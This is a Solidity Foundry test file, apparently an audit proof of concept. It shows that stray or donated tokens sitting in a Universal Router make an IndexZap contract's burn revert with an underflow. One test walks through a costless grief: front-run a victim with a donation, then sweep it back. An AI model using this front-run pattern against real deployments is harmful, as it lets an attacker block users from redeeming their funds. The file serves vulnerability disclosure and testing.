// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {stdError} from "forge-std/StdError.sol";
import {IndexZapTest} from "../IndexZap.t.sol";
import {IIndexZap} from "../../src/interfaces/IIndexZap.sol";
import {PathKey} from "../../src/libraries/UniswapV4Types.sol";
import {UniversalRouterCommands as Cmd} from "../../src/libraries/UniversalRouterCommands.sol";

/// @notice PoC: a stray balance of the token a burn leg sells, sitting in the Universal Router, larger than what the
///         leg sells, makes the zap's burn revert with an arithmetic underflow (Panic 0x11) instead of refunding it.
///         IndexZap.sol:316 (`_v3Hop`) and :346 (`_sellV4`) compute `inBefore - token.balanceOf(address(this))`
///         with checked arithmetic INSIDE `Math.saturatingSub`; the router's SWEEP returns the stray with the unsold
///         part, so the zap's balance ends ABOVE `inBefore` and the inner subtraction underflows.
///         The mint side (`_buy`, :189) saturates correctly, which is why the existing stray test (mint only) passes.
interface IERC20Like {
    function approve(address, uint256) external returns (bool);
}

contract ZapStrayRouterBurnPoC is IndexZapTest {
    address griefer = makeAddr("griefer");

    function _burnAll(IIndexZap.BurnLeg[] memory legs) internal returns (uint256) {
        vm.startPrank(alice);
        index.approve(address(zap), 1e18);
        uint256 out = zap.burnToToken(_burnParams(address(index), 1e18, address(usdc), 1, legs, alice));
        vm.stopPrank();
        return out;
    }

    /// @dev Baseline: the same burn succeeds with a clean router.
    function test_PoC_baselineBurnSucceeds() public {
        _mintFor(alice, 1e18, 200e6);
        uint256 out = _burnAll(_burnLegs(address(usdc)));
        assertGt(out, 0);
    }

    /// @dev V3 legs: the first hop that sells WETH is the WBTC leg's second hop (0.001 WBTC = $60 = 0.02 WETH).
    ///      0.05 WETH sitting in the router (an accident, or a front-run donation) reverts the whole burn with
    ///      Panic(0x11). A stray <= the first WETH hop's sale is instead forwarded to `to` as "unsold".
    function test_PoC_strayRouterWethBlocksV3Burn() public {
        _mintFor(alice, 1e18, 200e6);
        weth.mint(address(router), 0.05e18); // stray / donated: more than the first WETH hop sells
        vm.startPrank(alice);
        index.approve(address(zap), 1e18);
        vm.expectRevert(stdError.arithmeticError);
        zap.burnToToken(_burnParams(address(index), 1e18, address(usdc), 1, _burnLegs(address(usdc)), alice));
        vm.stopPrank();
        assertEq(index.balanceOf(alice), 1e18, "burn blocked");
    }

    /// @dev The intermediate hop of a multi-hop V3 leg is affected too: LINK -> WETH -> USDC hands hop 2 the WETH hop 1
    ///      produced (1 LINK = $15 = 0.005 WETH); a stray 0.006 WETH is enough, even with the WETH leg itself routed on V4.
    function test_PoC_strayRouterWethBlocksIntermediateHop() public {
        address[] memory t = new address[](1);
        uint256[] memory u = new uint256[](1);
        t[0] = address(link);
        u[0] = U_LINK;
        address idx = factory.createIndex("Link", "LNK", t, u, 0);
        IIndexZap.MintLeg[] memory mintLegs = new IIndexZap.MintLeg[](1);
        mintLegs[0] =
            IIndexZap.MintLeg({v3Path: _path3(address(link), address(weth), address(usdc)), v4Path: _noV4(), maxAmountIn: 0});
        usdc.mint(alice, 100e6);
        vm.startPrank(alice);
        usdc.approve(address(zap), 100e6);
        zap.mintWithToken(_mintParams(idx, address(usdc), 100e6, 1e18, mintLegs, alice));
        vm.stopPrank();

        IIndexZap.BurnLeg[] memory legs = new IIndexZap.BurnLeg[](1);
        legs[0] =
            IIndexZap.BurnLeg({v3Path: _path3(address(link), address(weth), address(usdc)), v4Path: _noV4(), minAmountOut: 0});
        weth.mint(address(router), 0.006e18); // hop 2 sells 0.005 WETH
        vm.startPrank(alice);
        IERC20Like(idx).approve(address(zap), 1e18);
        vm.expectRevert(stdError.arithmeticError);
        zap.burnToToken(_burnParams(idx, 1e18, address(usdc), 1, legs, alice));
        vm.stopPrank();
    }

    /// @dev V4 leg: `_sellV4` has the same checked subtraction.
    function test_PoC_strayRouterComponentBlocksV4Burn() public {
        _mintFor(alice, 1e18, 200e6);
        IIndexZap.BurnLeg[] memory legs = _burnLegs(address(usdc));
        legs[2] = IIndexZap.BurnLeg({v3Path: "", v4Path: _v4Path1(address(usdc)), minAmountOut: 0});
        link.mint(address(router), 2e18); // the LINK leg sells U_LINK = 1e18
        vm.startPrank(alice);
        index.approve(address(zap), 1e18);
        vm.expectRevert(stdError.arithmeticError);
        zap.burnToToken(_burnParams(address(index), 1e18, address(usdc), 1, legs, alice));
        vm.stopPrank();
    }

    /// @dev The grief costs only gas: donate, let the victim's burn revert, sweep the donation back (SWEEP is
    ///      permissionless on the real router; here the mock lets a caller sweep to itself).
    function test_PoC_griefCostsTheAttackerNothing() public {
        _mintFor(alice, 1e18, 200e6);
        weth.mint(griefer, 1e18); // any amount above the first WETH hop's sale (0.02 WETH here)
        uint256 before = weth.balanceOf(griefer);

        vm.prank(griefer);
        weth.transfer(address(router), 1e18); // front-run

        vm.startPrank(alice);
        index.approve(address(zap), 1e18);
        vm.expectRevert(stdError.arithmeticError);
        zap.burnToToken(_burnParams(address(index), 1e18, address(usdc), 1, _burnLegs(address(usdc)), alice));
        vm.stopPrank();

        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(address(weth), griefer, uint256(0));
        vm.prank(griefer);
        router.execute(abi.encodePacked(Cmd.SWEEP), inputs); // back-run
        assertEq(weth.balanceOf(griefer), before, "the griefer recovered the whole donation");
    }

    /// @dev Contrast: the mint side saturates, so the same kind of stray is a refund there, as documented.
    function test_PoC_mintSideSaturatesCorrectly() public {
        usdc.mint(address(router), 500e6);
        uint256 spent = _mintFor(alice, 1e18, 200e6);
        assertEq(spent, 0);
    }
}
